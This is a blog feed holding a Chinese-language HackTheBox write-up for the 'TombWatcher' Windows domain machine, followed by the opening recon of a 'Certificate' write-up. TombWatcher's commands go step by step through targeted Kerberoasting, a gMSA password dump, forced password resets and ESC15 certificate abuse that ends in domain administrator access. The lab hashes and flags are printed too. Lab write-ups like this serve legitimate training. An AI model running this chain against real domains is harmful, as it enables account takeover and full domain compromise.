            <description><![CDATA[Season8 TombWatcher https://app.hackthebox.com/machines/TombWatcher | Windows | Medium Machine Informationï¼šAs is common in real life Windows pentests,...]]></description>
            <content:encoded><![CDATA[
# Season8 - TombWatcher

> https://app.hackthebox.com/machines/TombWatcher | `Windows`Â |Â `Medium`
> 

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image.png)

Machine Informationï¼šAs is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

## Recon

### ç«¯å£æ‰«æ

`nmap` ç«¯å£æ‰«æ

```bash
âœ  TombWatcher nmap -sT -min-rate 5000 10.10.11.72  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:01 CST
Nmap scan report for 10.10.11.72
Host is up (0.059s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

```bash
âœ  TombWatcher nmap -sT -A -p 53,80,88,135,139,389,445,464,5985 10.10.11.72                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:03 CST                                                   
Nmap scan report for 10.10.11.72                         
Host is up (0.10s latency).    
                                                         
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0    
|_http-server-header: Microsoft-IIS/10.0                                                                          
| http-methods:                                                                                                   
|_  Potentially risky methods: TRACE            
|_http-title: IIS Windows Server    
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 07:41:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T07:42:31+00:00; +3h38m21s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-08T07:41:51
|_  start_date: N/A
|_clock-skew: mean: 3h38m20s, deviation: 0s, median: 3h38m20s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   85.41 ms  10.10.16.1
2   128.13 ms 10.10.11.72
```

è®¿é—®`HTTP`ï¼Œæ˜¯é»˜è®¤é¡µ

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image1.png)

æ‰«æäº†ä¸€æ³¢ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œé‡ç‚¹åº”è¯¥ä¸åœ¨è¿™ï¼Œå› ä¸ºç»™äº†å‡­æ®

### å‡­æ®æµ‹è¯• & æœåŠ¡æšä¸¾

ä½¿ç”¨ `nxc` å¯¹å‡­æ®è¿›è¡Œæµ‹è¯•

```bash
âœ  TombWatcher nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
âœ  TombWatcher nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
âœ  TombWatcher nxc wmi 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
RPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
RPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
âœ  TombWatcher nxc winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!
```

```bash
âœ  TombWatcher wmiexec.py tombwatcher.htb/henry:'H3nry_987TGV!'@10.10.11.72 -dc-ip 10.10.11.72
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
```

`SMB` ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆä¿¡æ¯

```bash
âœ  TombWatcher smbclient -L 10.10.11.72 -U tombwatcher.htb/henry%'H3nry_987TGV!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## åŸŸåˆ†æ - 1

```bash
âœ  TombWatcher bloodhound-python -u henry -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns 10.10.11.72 --zip -c All -dc 'DC01.tombwatcher.htb' --dns-tcp
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 12 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 12S
INFO: Compressing output into 20250608163651_bloodhound.zip
```

`henry` æ‰€å±ç»„æƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image2.png)

å¯¹`Alfred`æœ‰`writeSPN`æƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image3.png)

æˆ‘ä»¬å†çœ‹ä¸€ä¸‹ `Alfred` çš„æƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image4.png)

ç»§ç»­è·Ÿè¿›`INFRASTRUCTURE` ç»„ï¼Œèƒ½å¤Ÿè¯»å–æœºå™¨`ANSIBLE_DEV`çš„`GMSA`å¯†ç 

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image5.png)

ç„¶å `ANSIBLE_DEV` èƒ½å¤Ÿæ›´æ”¹ `SAM` ç”¨æˆ·å¯†ç 

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image6.png)

å¹¶ä¸” `SAM` ç”¨æˆ·å¯¹ `JOHN`ç”¨æˆ·æ‹¥æœ‰ `genericAll`

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image7.png)

ç”¨æˆ·`John`çš„æƒé™ï¼Œæ˜¯è¿œç¨‹ç®¡ç†ç»„çš„æˆå‘˜

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image8.png)

## åŸŸæ¸—é€

### Kerberoasting

> https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting
> 

æ”»å‡»è€…å¯ä»¥å°† SPN ï¼ˆ`ServicePrincipalName`ï¼‰ æ·»åŠ åˆ°è¯¥å¸æˆ·ã€‚ä¸€æ—¦è´¦æˆ·æ‹¥æœ‰ SPNï¼Œå®ƒå°±å®¹æ˜“å—åˆ°Â `Kerberoast` çš„æ”»å‡»Â ã€‚è¿™ç§æŠ€æœ¯ç§°ä¸º `Targeted Kerberoasting`

å·¥å…·é“¾æ¥ï¼šhttps://github.com/ShutdownRepo/targetedKerberoast

```bash
âœ  targetedKerberoast python targetedKerberoast.py -v -d tombwatcher.htb --dc-ip 10.10.11.72 -u henry -p 'H3nry_987TGV!'
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image9.png)

ä½¿ç”¨`hashcat`è¿›è¡Œçˆ†ç ´

```bash
âœ  targetedKerberoast hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```

å¾—åˆ°å¯†ç  `basketball`

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image10.png)

### ReadGMSAPassword

æµ‹è¯•`alfred`çš„å‡­æ®

```bash
âœ  TombWatcher nxc smb 10.10.11.72 -u alfred -p 'basketball' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball 
```

ä¸Šè¾¹åˆ†æåŸŸçš„æ—¶å€™èƒ½çŸ¥é“`alfred`ç”¨æˆ·å¯ä»¥è¯»å–`ANSIBLE_DEV` è®¡ç®—æœºçš„`GMSA`å¯†ç 

å·¥å…·ï¼šhttps://github.com/micahvandeusen/gMSADumper

```bash
âœ  gMSADumper python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
```

æµ‹è¯•`ansible_dev$`çš„å‡­æ®

```bash
âœ  TombWatcher nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb   
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc 
```

### To John

`ansible_dev$` æ‹¥æœ‰æ›´æ”¹ `SAM`ç”¨æˆ·å¯†ç çš„æƒé™

```bash
âœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --dc-ip 10.10.11.72 set password SAM 'Password123!'
[+] Password changed successfully!
```

æµ‹è¯• `SAM` å‡­æ®

```bash
âœ  TombWatcher nxc smb 10.10.11.72 -u 'SAM' -p 'Password123!' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\SAM:Password123! 
```

æˆ‘ä»¬å†é€šè¿‡`SAM`ç”¨æˆ·ä¿®æ”¹`John`ç”¨æˆ·çš„å¯†ç 

```bash
âœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set owner john sam
[!] S-1-5-21-1392491010-1358638721-2126982587-1105 is already the owner, no modification will be made

âœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 add genericAll john sam
[+] sam has now GenericAll on john

âœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set password JOHN 'Password123!'
[+] Password changed successfully!
```

ä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»å½•

```bash
âœ  TombWatcher evil-winrm -i 10.10.11.72 -u 'JOHn' -p 'Password123!'                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> 
```

èƒ½è¯»å– `user.txt`

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
3941928223b1baf7d3a3b94a3953d597
```

## åŸŸåˆ†æ - 2

æ‹¿åˆ° `John` ç”¨æˆ·åï¼Œæˆ‘ä»¬å†è¿›è¡Œåˆ†æä¸€æ¬¡ï¼Œå¯»æ‰¾è·å¾—`Root`çš„è·¯å¾„

`John` çš„æƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image11.png)

è¿™åå­—å¸¦`CERT`ï¼Œä¿®æ”¹`CERT_ADMIN`å¯†ç ï¼Œå¹¶ç”¨å…¶å°è¯•ä½¿ç”¨ `certipy` æšä¸¾æ¼æ´

```bash
âœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'JOHN' -p 'Password123!' --dc-ip 10.10.11.72 set password CERT_ADMIN 'Password123!'
[+] Password changed successfully!
```

```bash
âœ  TombWatcher certipy-ad find -u 'CERT_ADMIN' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250608182737_Certipy.txt'
[*] Wrote text output to '20250608182737_Certipy.txt'
[*] Saving JSON output to '20250608182737_Certipy.json'
[*] Wrote JSON output to '20250608182737_Certipy.json'
```

æ£€æµ‹åˆ° `ESC15`

```bash
âœ  TombWatcher cat 20250608182737_Certipy.txt  
Certificate Authorities                    
  0                                        
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment          
      HTTP                                                                                                        
        Enabled                         : False                                                                   
      HTTPS                                                                                                       
        Enabled                         : False
    User Specified SAN                  : Disabled                                                                
    Request Disposition                 : Issue                                                                   
    Enforce Encryption for Requests     : Enabled                                                                 
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions                                                                                                   
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights                                                                                               
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins    
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins                 
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users      
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image12.png)

## ESC 15

> https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu
> 

```bash
âœ  TombWatcher certipy-ad req \
    -u 'CERT_ADMIN' -p 'Password123!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb' \
    -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 33
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
âœ  TombWatcher certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator
```

æˆ‘ç›´æ¥æŠŠ `henry` åŠ å…¥ç®¡ç†å‘˜ç»„å’Œè¿œç¨‹ç»„

```bash
# add_user_to_group henry "Domain Admins"
Adding user: Henry to group Domain Admins result: OK

# add_user_to_group henry "REMOTE MANAGEMENT USERS"
Adding user: Henry to group Remote Management Users result: OK
```

ä½¿ç”¨ `evil-winrm` ç™»å½•å¹¶è¯»å– `root.txt`

```bash
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
6d2352d2fcafb6b19e95e737b046864c
```

## æ€»ç»“

ä¸€æ³¢ä¸‹æ¥ç›´æ¥æ¢­å“ˆï¼Œè¿™æ¬¡æ²¡æœ‰å¡ä½çš„åœ°æ–¹

ä½†æ˜¯æˆ‘æ‰“å®Œåå‘ç°ï¼Œæˆ‘`BloodHound`æ”¶é›†ä¿¡æ¯çš„æ—¶å€™ï¼Œæœºå™¨å·²ç»æ˜¯è¢«äººä¿®æ”¹è¿‡çš„äº†

æ­£å¸¸æ¥è¯´æˆ‘æ˜¯ä¸èƒ½ç›´æ¥åœ¨`BloodHound`ä¸­å‘ç°`CERT_ADMIN`ç”¨æˆ·çš„ï¼Œå› ä¸ºå®ƒæ˜¯å·²ç»è¢«åˆ é™¤çš„ç”¨æˆ·ï¼Œæˆ‘éœ€è¦å¯¹å…¶è¿›è¡Œæ¢å¤ï¼Œå†è¿›è¡Œåç»­æ“ä½œ

```bash
# Enum isDeleted ADObject
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image13.png)

```bash
# æ¢å¤è´¦å·
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
# æ¿€æ´»è´¦å·
Enable-ADAccount -Identity cert_admin
```

ç„¶åæ‰å¯ä»¥æ˜¯ç”¨`BloodAD`è¿›è¡Œä¿®æ”¹å¯†ç ï¼Œè¿™é‡Œç›¸å½“äºç»™æˆ‘é™éš¾åº¦äº†

```bash
(Get-Acl "AD:CN=john,CN=Users,DC=tombwatcher,DC=htb").Access
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>ESC15</category>
            <category>Kerberoasting</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Certificate]]></title>
            <link>https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate</guid>
            <pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season8 Certificate https://app.hackthebox.com/machines/Certificate | Windows | Hard å‰æœŸè¸©ç‚¹ åˆšåˆšå°è¯•äº†SMBæ— æ³•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºè¿˜æ‰«æåˆ°äº†80ç«¯å£ï¼Œæ‰€ä»¥ä»Webä¸‹æ‰‹ Web è®¿é—® HTTP å¹¶é‡‡é›†æŒ‡çº¹ ...]]></description>
            <content:encoded><![CDATA[
# Season8 - Certificate

> https://app.hackthebox.com/machines/Certificate | `Windows` | `Hard`
> 

## å‰æœŸè¸©ç‚¹

```bash
âœ  Certificate nmap -sT -min-rate 5000 10.10.11.71             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST
Nmap scan report for 10.10.11.71
Host is up (0.050s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

```bash
âœ  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST
Nmap scan report for 10.10.11.71
Host is up (0.076s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp open  microsoft-ds?
636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-01T20:58:58
|_  start_date: N/A
|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   85.58 ms 10.10.16.1
2   87.46 ms 10.10.11.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.74 seconds
```

åˆšåˆšå°è¯•äº†`SMB`æ— æ³•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºè¿˜æ‰«æåˆ°äº†`80`ç«¯å£ï¼Œæ‰€ä»¥ä»`Web`ä¸‹æ‰‹

## Web

è®¿é—® `HTTP` å¹¶é‡‡é›†æŒ‡çº¹

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image.png)

å…¶ä¸­è¿˜æœ‰ç™»å½•é¡µå’Œæ³¨å†Œé¡µ

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png)

åˆ›å»ºäº†ä¸€ä¸ªè´¦æˆ· `sunset` å¹¶ä½¿ç”¨è´¦æˆ·è¿›è¡Œç™»å½•ï¼Œå¹¶ä¸”ç”¨æˆ·ç±»å‹æœ‰`student`å’Œ`teacher`ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆç™»é™†ä¹‹åæ‰æœ‰çš„åŠŸèƒ½ï¼Œæ•™å¸ˆç”¨æˆ·ç™»å½•ä¸è¿›å»

æ‰«æä¸€ä¸‹ç½‘ç«™ç›®å½•

```bash
âœ  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt

Target: http://certificate.htb/

[21:34:42] Starting: 
[21:34:50] 200 -   14KB - /about.php
[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl
[21:35:05] 200 -    0B  - /db.php
[21:35:09] 200 -    3KB - /footer.php
[21:35:10] 200 -    2KB - /header.php
[21:35:15] 200 -    9KB - /login.php
[21:35:15] 302 -    0B  - /logout.php  ->  login.php
[21:35:25] 200 -   11KB - /register.php
[21:35:30] 301 -  343B  - /static  ->  http://certificate.htb/static/
[21:35:30] 301 -  345B  - /static..  ->  http://certificate.htb/static../
[21:35:34] 302 -    0B  - /upload.php  ->  login.php

Task Completed
```

æ‰«æå‡ºæ¥ `upload.php` è®¿é—®ä¸€ä¸‹ï¼Œè²Œä¼¼ç¼ºå°‘å‚æ•°

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png)

æœ€ååœ¨ `course` ä¸­å¯ä»¥æ‰¾åˆ°ä¸Šä¼ é¡µé¢

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png)

è¯¥å¤„å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´

### æ–‡ä»¶ä¸Šä¼ åˆ©ç”¨ & ZipSlip? & **ZIP Concatenation?**

ä¸Šä¼ é¡µé¢ä¸­æç¤ºï¼š

- Please select the assignment file you want to upload (the file will be reviewed by the course instructor)
    
    è¯·é€‰æ‹©æ‚¨è¦ä¸Šä¼ çš„ä½œä¸šæ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶å°†ç”±è¯¾ç¨‹è®²å¸ˆå®¡æ ¸ï¼‰
    
- We accept only the following file types: `.pdf` `.docx` `.pptx` `.xlsx`
    
    æˆ‘ä»¬åªæ¥å—ä»¥ä¸‹æ–‡ä»¶ç±»å‹ï¼š`.pdf` `.docx` `.pptx` `.xlsx`
    
- You include the assignment file in .zip archive file to reduce it's size
    
